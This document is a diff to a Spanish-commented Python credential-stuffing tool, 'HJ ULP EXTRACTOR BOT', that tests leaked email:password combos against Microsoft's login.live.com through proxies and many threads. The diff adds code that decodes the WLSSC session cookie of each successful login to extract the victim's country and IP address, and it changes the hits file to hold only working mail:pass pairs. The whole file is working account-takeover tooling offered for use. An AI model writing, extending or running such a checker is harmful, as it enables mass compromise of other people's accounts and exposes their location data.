@@ -2,9 +2,10 @@
 ═══════════════════════════════════════════════════════════════
   HJ ULP EXTRACTOR BOT — Hotmail/Microsoft Account Checker
 ═══════════════════════════════════════════════════════════════
-  • Adaptado del script MS Account Checker v3.3-crudo by HacheJota
+  • Adaptado del script MS Account Checker v4.1-wlssc by HacheJota
   • Login por OAuth RPS (login.live.com/oauth20_authorize.srf)
   • Clasifica: HIT / BAD / 2FA / LOCKED / UNKNOWN / ERROR
+  • Extrae país + IP desde la cookie WLSSC (formato binario)
   • Soporta proxies: HTTP, HTTPS, SOCKS5, con o sin auth
   • ThreadPoolExecutor para paralelizar
 ═══════════════════════════════════════════════════════════════
@@ -12,6 +13,7 @@
 
 import os
 import re
+import base64
 import time
 import threading
 from urllib.parse import quote, unquote
@@ -24,6 +26,7 @@ from requests.adapters import HTTPAdapter
 from requests.packages.urllib3.util.retry import Retry
 
 from logger_setup import logger
+from hotmail_paises import get_country_info, get_name_from_iso, get_flag_from_iso
 
 # ── Config ──────────────────────────────────────────────────
 HOTMAIL_TIMEOUT = 20
@@ -55,6 +58,95 @@ STATUS_2FA = "2FA"
 STATUS_LOCKED = "LOCKED"
 STATUS_UNKNOWN = "UNKNOWN"
 STATUS_ERROR = "ERROR"
+
+
+# ═════════════════════════════════════════════════════════════
+#  EXTRACTOR DE PAÍS DESDE COOKIE WLSSC (v4.1 by HacheJota)
+# ═════════════════════════════════════════════════════════════
+#  La cookie WLSSC contiene el país en formato binario.
+#  Estructura observada:
+#      [email][1-2 bytes variables][2 letras MAYÚSCULAS][\x00]
+#  donde las 2 letras son el código ISO del país (TR, CO, MX, US, ...).
+#
+#  Ejemplos reales:
+#      TR: 00 00 00 07 54 52 00
+#      CO: 00 00 0d 13 43 4f 00
+#      MX: 00 00 00 32 4d 58 00
+# ═════════════════════════════════════════════════════════════
+
+# Patrones para extraer ISO del país desde la cookie WLSSC decodificada.
+# Ordenados por especificidad (más restrictivos primero).
+_WLSSC_PATTERNS = [
+    # V1: 00 00 [XX] 00 (más específico)
+    re.compile(rb'\x00\x00[\x00-\xff]{1,2}([A-Z]{2})\x00'),
+    # V2: 00 00 00 [XX] 00
+    re.compile(rb'\x00\x00\x00[\x00-\xff]{0,2}([A-Z]{2})\x00'),
+    # V3: [ctrl] XX [ctrl] (más laxa)
+    re.compile(rb'[\x00-\x1f]([A-Z]{2})[\x00-\x1f]'),
+]
+
+# Patrón para extraer IP de la cookie WLSSC
+_WLSSC_IP_PATTERN = re.compile(rb'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
+
+
+def extract_country_from_wlssc(wlssc_b64: str, email: str) -> Optional[str]:
+    """Extraer código ISO del país desde la cookie WLSSC de Microsoft.
+
+    La cookie viene en base64. Al decodificarla, contiene un bloque binario
+    con el email y, después, 2 bytes ASCII con el código ISO del país
+    terminados en \\x00.
+
+    Returns:
+        ISO de 2 letras (ej: 'AR', 'MX', 'US') o None si no se encuentra.
+    """
+    if not wlssc_b64:
+        return None
+
+    try:
+        data = base64.b64decode(wlssc_b64)
+    except Exception:
+        return None
+
+    if not data:
+        return None
+
+    # Localizar el SEGUNDO email (el país viene después del segundo)
+    email_bytes = email.encode("ascii", errors="ignore").lower()
+    idx1 = data.lower().find(email_bytes)
+    idx2 = data.lower().find(email_bytes, idx1 + len(email_bytes)) if idx1 >= 0 else -1
+
+    if idx2 >= 0:
+        search_from = idx2
+    elif idx1 >= 0:
+        search_from = idx1
+    else:
+        search_from = 0
+
+    # Buscar SOLO después del email encontrado
+    region = data[search_from:] if search_from > 0 else data
+
+    for pattern in _WLSSC_PATTERNS:
+        m = pattern.search(region)
+        if m:
+            iso = m.group(1).decode("ascii", errors="ignore")
+            if iso and len(iso) == 2:
+                return iso.upper()
+
+    return None
+
+
+def extract_ip_from_wlssc(wlssc_b64: str) -> Optional[str]:
+    """Extraer la IP de salida del usuario desde la cookie WLSSC."""
+    if not wlssc_b64:
+        return None
+    try:
+        data = base64.b64decode(wlssc_b64)
+    except Exception:
+        return None
+    m = _WLSSC_IP_PATTERN.search(data)
+    if m:
+        return m.group(1).decode("ascii", errors="ignore")
+    return None
 
 
 def parse_proxy(proxy_str: str) -> Optional[str]:
@@ -317,12 +409,37 @@ def _worker(combo: str, proxy: Optional[str] = None) -> Optional[dict]:
 
         status, access_token = _classify_result(r, session)
 
-        return {
+        result = {
             "combo": combo,
             "status": status,
             "access_token": access_token,
             "proxy": proxy or "direct",
         }
+
+        # Si es HIT, extraer país + IP desde la cookie WLSSC
+        if status == STATUS_HIT:
+            try:
+                wlssc = None
+                for c in session.cookies:
+                    if c.name == "WLSSC":
+                        wlssc = c.value
+                        break
+
+                if wlssc:
+                    iso = extract_country_from_wlssc(wlssc, user)
+                    if iso:
+                        result["iso"] = iso
+                        name, flag = get_country_info(iso)
+                        result["country"] = name
+                        result["flag"] = flag
+
+                    ip = extract_ip_from_wlssc(wlssc)
+                    if ip:
+                        result["ip"] = ip
+            except Exception as e:
+                logger.debug(f"[HOTMAIL] Error extrayendo país/IP para {user}: {e}")
+
+        return result
 
     except Exception as e:
         return {"combo": combo, "status": STATUS_ERROR,
@@ -422,14 +539,10 @@ def hotmail_check_file(input_path: Path, output_path: Path,
                 except Exception:
                     pass
 
-    # Escribir archivo de hits: combo + access_token (si lo hay)
+    # Escribir archivo de hits: SOLO mail:pass (sin token, sin extras)
     with open(output_path, 'w', encoding='utf-8', buffering=1024 * 64) as f:
         for h in hits_data:
-            tok = h.get("access_token")
-            if tok:
-                f.write(f"{h['combo']} | token={tok}\n")
-            else:
-                f.write(h["combo"] + "\n")
+            f.write(h["combo"] + "\n")
 
     elapsed = time.time() - start_time
     stats = {
